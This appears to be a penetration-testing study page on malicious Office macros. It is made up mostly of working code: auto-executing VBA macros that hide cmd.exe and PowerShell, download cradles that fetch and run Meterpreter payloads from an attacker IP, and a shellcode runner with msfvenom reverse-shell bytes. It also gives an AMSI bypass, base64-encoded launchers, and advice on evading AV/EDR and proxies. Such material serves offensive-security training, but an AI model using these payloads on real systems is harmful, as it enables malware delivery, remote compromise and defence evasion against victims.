**Using cmd.exe and using the VBA Shell function:**

Macro example:

```
Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Sub MyMacro()
  Dim str As String
  str = "cmd.exe"
  Shell str, vbHide
End Sub
```

**Using Windows Script Host(WSH) to launch a cmd.exe:**

Macro example:

```
Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Sub MyMacro()
  Dim str As String
  str = "cmd.exe"
  CreateObject("Wscript.Shell").Run str, 0
End Sub
```

**Let powershell help us:**

Downloading an executable, writing it to disk and then exectuting it(take into acount PowerShell Constrained Language Mode):

```
Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
Sub MyMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
  Shell str, vbHide
  Dim exePath As String
  exePath = ActiveDocument.Path + "\msfstaged.exe"
  Wait (2)
  Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
    DoEvents
  Loop Until Now >= DateAdd("s", n, t)
End Sub
```
(note that in this script we also added a time delay, since the download time of our executable may vary)

Powershell shellcode runner using the Add-Type compilation method:

Take this PowerShell Script(save it as run.ps1), and then serve it through an HTTP server on port 80.

```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
      [DllImport("kernel32")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

      [DllImport("kernel32", CharSet=CharSet.Ansi)]
      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

      [DllImport("kernel32.dll", SetLastError=true)]
      public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}

"@

Add-Type $Kernel32

#msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Macro to trigger the execution of our PowerShell shellcode runner:

```
Sub MyMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
  Shell str, vbHide
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
```

Using the Add-Type compilation, leaves so many artifacts behind, meaning that some AV/EDR could catch our malicious macro and stop its execution. Also another thing that we must take into account when
executing PowerShell code thourgh IEX(Invoke-Expression) is AMSI. So we first must bypass AMSI and then execute our PowerShell malicious code. To bypass the AMSI in powershell you can take any of this [methods](https://github.com/trike33/PEN-300-Code-Snippets/tree/main/AMSI%20Bypasses/PowerShell). Altough I prefer this [one](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/AMSI%20Bypasses/PowerShell/AmsiContext.ps1) due to its simplicity. 

This is how we would implement it in a real life scenario:

```
Amsi bypass(amsi.txt) file contents:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

IEX(New-Object System.Net.WebClient).downloadString('http://192.168.1.1/run.ps1')

The run.ps1 file is a powershell shellcode runner. Due to the complexity of this technique, we will base64 encode our PowerShell download cradle ass follows:
~# pwsh
❯ pwsh
PowerShell 7.2.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

   A new PowerShell stable release is available: v7.3.4 
   Upgrade now, or check out the release page at:       
     https://aka.ms/PowerShell-Release?tag=v7.3.4       

Welcome to Parrot OS 

┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt')"
┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)                                   ┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $EncodedText = [Convert]::ToBase64String($bytes)                                           ┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$ $EncodedText                                                                              SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADUALwBhAG0AcwBpAC4AdAB4AHQAJwApAA==
┌[trike@root]-[11:11-12/07]-[/home/trike]
└╼$

Then we will embed the command to our macro:
Sub MyMacro()
  Dim str As String
  str = "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADUALwBhAG0AcwBpAC4AdAB4AHQAJwApAA=="
  Shell str, vbHide
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

So if our attack was successful we must recieve first a request for the amsi.txt file and then, secondly a request for our run.ps1 file.
```

As previously mentioned the Add-Type compilation leaves many artifacts behind and those artifacts are written to disk. Since we want to be as stealthier as posible, we will use an in-memory powershell shellcode runner. Here is one: https://github.com/trike33/PEN-300-Code-Snippets/blob/main/powershell_reflection_shellcoderunner.ps1

This powershell shellcode runner its perfect for us! Because if we chain it with the previously implemented AMSI bypass we will have a shell that resides fully in memory.

**IMPORTANT THING TO REMEMBER WHEN EXECUTING A MALICIOUS MACRO:**

It is recommended to use the "prependmigrate=true" meterpreter option in order to have an stable shell. Since to execute our dropper we will spawn a cmd.exe process as a child process of WINWORD.exe, meaning that some AV/EDR will notice this an kill our dropper.

Here is what the prependmigrate option does:

```
PrependMigrate             false                      yes       Spawns and runs shellcode in new process
```
(In a nutshell it spawns our shellcode in another process)

Additionally keep in mind that our shellcode must be for 32-bits -> very important, if we use x64 we won't get any shell

**PowerShell Proxy-aware communications:**

As a SYSTEM integrity proxy-aware communication:

```
#This is powershell code, therefore it must be inside a powershell script

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start =
$key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object
System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.1.1/run.ps1")
```

Fiddling with the user-agent:

```
#This is powershell code, therefore it must be inside a powershell script

$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "UniqueUserAgent123456...")
$wc.DownloadString("http://192.168.1.1/run.ps1")
```

Evading the proxy:

```
#This is powershell code, therefore it must be inside a powershell script

$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.1.1/run.ps1")
```
